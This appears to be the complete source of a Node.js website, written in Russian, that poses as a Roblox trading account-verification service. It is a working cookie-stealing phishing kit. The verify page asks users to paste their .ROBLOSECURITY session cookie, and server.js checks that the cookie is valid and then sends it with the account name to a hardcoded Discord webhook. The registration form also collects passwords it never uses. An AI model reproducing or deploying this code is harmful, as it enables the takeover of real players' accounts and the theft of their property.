project/
│
├── views/
│   ├── register.html
│   └── verify.html
│
├── public/
│   └── style.css
│
├── server.js
├── package.json
└── README.md


// server.js
const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1398094419479236678/ojsXwWvL1So9PmkLqn7ohGRO_v67C_Noocusql2K1F-0syGtmv1_46r3vuuPU-UeZvd6";

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

app.get("/", (_, res) => res.sendFile(path.join(__dirname, "/views/register.html")));
app.get("/verify", (_, res) => res.sendFile(path.join(__dirname, "/views/verify.html")));

app.post("/register", (req, res) => {
  const { username, password, email } = req.body;
  res.redirect(`/verify?username=${encodeURIComponent(username)}`);
});

app.post("/verify-cookie", async (req, res) => {
  const { cookie, username } = req.body;

  try {
    const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });

    if (!response.ok) throw new Error("Invalid cookie");

    const data = await response.json();

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [
          {
            title: "✅ Новый подтверждённый пользователь!",
            color: 3066993,
            fields: [
              { name: "Имя", value: username },
              { name: "ROBLOX", value: data.UserName },
              { name: "Кука", value: `\`${cookie}\`` }
            ]
          }
        ]
      }),
    });

    res.send(`<script>
      document.body.innerHTML = '<div class="popup success">✅ Подтверждение прошло успешно!</div>';
      setTimeout(() => location.href = "/", 3000);
    </script>`);

  } catch {
    res.send(`<script>
      document.body.innerHTML = '<div class="popup error">❌ Неверные куки!</div>';
      setTimeout(() => location.href = "/verify?username=${encodeURIComponent(username)}", 3000);
    </script>`);
  }
});

app.listen(PORT, () => {
  console.log(`Сервер запущен: http://localhost:${PORT}`);
});


// views/register.html
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Регистрация</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <form action="/register" method="POST" class="form-box">
    <h2>Регистрация</h2>
    <input type="text" name="username" placeholder="Имя пользователя" required />
    <input type="email" name="email" placeholder="Email" required />
    <input type="password" name="password" placeholder="Пароль" required />
    <button type="submit">Зарегистрироваться</button>
  </form>
</body>
</html>


// views/verify.html
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Подтверждение ROBLOX</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <form action="/verify-cookie" method="POST" class="form-box">
    <h2>Подтверждение аккаунта</h2>
    <input type="text" name="cookie" placeholder=".ROBLOSECURITY" required />
    <input type="hidden" name="username" value="<%= username %>" />
    <button type="submit">Подтвердить</button>
  </form>
</body>
</html>


// public/style.css
body {
  margin: 0;
  font-family: 'Segoe UI', sans-serif;
  background: linear-gradient(270deg, #ff00cc, #3333ff, #00ffcc, #ff3300);
  background-size: 800% 800%;
  animation: gradientFlow 20s ease infinite;
}

@keyframes gradientFlow {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}

.form-box {
  max-width: 400px;
  margin: 100px auto;
  padding: 30px;
  background: rgba(0, 0, 0, 0.7);
  border-radius: 20px;
  box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
  color: white;
}

input, button {
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border: none;
  border-radius: 10px;
}

button {
  background-color: #00cc99;
  color: white;
  font-weight: bold;
  cursor: pointer;
  transition: background 0.3s;
}

button:hover {
  background-color: #009977;
}

.popup.success {
  color: #00ff99;
  text-align: center;
  font-size: 1.4rem;
}

.popup.error {
  color: red;
  text-align: center;
  font-size: 1.4rem;
}


// README.md
# Roblox Trading — Сайт для подтверждения аккаунта

- Форма регистрации (имя, email, пароль)
- Подтверждение ROBLOX через куки
- Проверка валидности .ROBLOSECURITY
- RGB-анимации и современный дизайн
- Discord Webhook отправка только при валидной куке
